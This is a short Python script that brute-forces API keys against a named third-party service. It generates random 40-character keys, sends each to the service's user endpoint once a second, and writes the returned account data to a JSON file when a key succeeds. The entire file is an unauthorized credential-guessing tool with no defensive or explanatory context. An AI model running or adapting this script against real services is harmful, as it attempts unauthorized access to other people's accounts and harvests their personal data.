import requests
import random
import string
import time

def generate_api_key(length=40):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def test_api_key(api_key):
    url = "https://ammo.lol/api/v1/client/user"
    headers = {
        "Content-Type": "application/json",
        "API-Key": api_key
    }
    
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        print(f"Success! Valid API key found: {api_key}")
        with open(f'user_info_{api_key}.json', 'w') as file:
            file.write(response.text)
        return True
    elif response.status_code == 401:
        print(f"Unauthorized: {api_key} is not valid.")
    else:
        print(f"Failed with status code {response.status_code} for API key: {api_key}")
    
    return False

while True:
    api_key = generate_api_key()
    if test_api_key(api_key):
        break
    time.sleep(1)
